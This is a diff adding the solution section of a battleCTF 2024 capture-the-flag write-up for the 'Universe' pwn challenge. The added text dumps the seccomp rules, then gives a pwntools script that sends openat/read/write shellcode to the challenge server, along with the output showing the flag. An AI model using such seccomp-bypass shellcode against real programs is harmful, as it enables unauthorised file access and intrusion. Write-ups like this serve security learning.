@@ -86,3 +86,44 @@ This seems very straight forward and we can immediately see that we can execute 
 
 ![Seccomp Rule Add](https://github.com/theMcSam/battleCTF-writeups/blob/main/battleCTF2024/Universe/images/seccomp_rule_add.png)    
 
+After discovering this i used `seccomp-tools` to get a dump of the rules applied.
+![Seccomp Tools Dump](https://github.com/theMcSam/battleCTF-writeups/blob/main/battleCTF2024/Universe/images/seccomp_tools_dump.png)    
+
+We can see that certain `syscalls` have been blocked and as a result we would have to craft our exploit shellcode with a `syscalls` that have not been listed here. In most CTFs the goal is to obtain the flag so i started searching for alternative `syscalls` i could abuse to read files on the target and get the flag.  After some searching, i decided to go with the `openat()` `syscall` to open and read files.
+
+Using pwntools python library i crafted an exploit.
+Find exploit code here:
+```python
+from pwn import *
+
+context.clear(arch="amd64")
+
+shellcode = shellcraft.linux.openat(-1, "/flag.txt")
+shellcode += shellcraft.linux.read('rax', 'rsp', 100)
+shellcode += shellcraft.linux.write(1, 'rsp', 100)
+
+assembled_shellcode = asm(shellcode)
+padding_size = 4096 - len(assembled_shellcode)
+payload = assembled_shellcode + b'\x90' * padding_size
+
+def main():
+    io = remote("challenge.bugpwn.com",1004)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+Upon executing this script i obtained the flag.
+```
+mcsam@0x32:~/Desktop/ctf/AfricaBattleCTF/pwn/universe$ python3 read.py 
+...
+Africa battleCTF 2024s
+By its very subject, cosmology flirts with metaphysics. Because how can we study an object from which we cannot extract ourselves? Einstein had this audacity and the Universe once again became an object of science. Without losing its philosophical dimension.
+What do you think of the universe?
+battleCTF{Are_W3_4l0ne_!n_7he_univ3rs3?_0e2899c65e58d028b0f553c80e5d413eeefef7af987fd4181e834ee6}
+\xa3p[*] Got EOF while reading in interactive
+```
+
+Flag: `battleCTF{Are_W3_4l0ne_!n_7he_univ3rs3?_0e2899c65e58d028b0f553c80e5d413eeefef7af987fd4181e834ee6}`
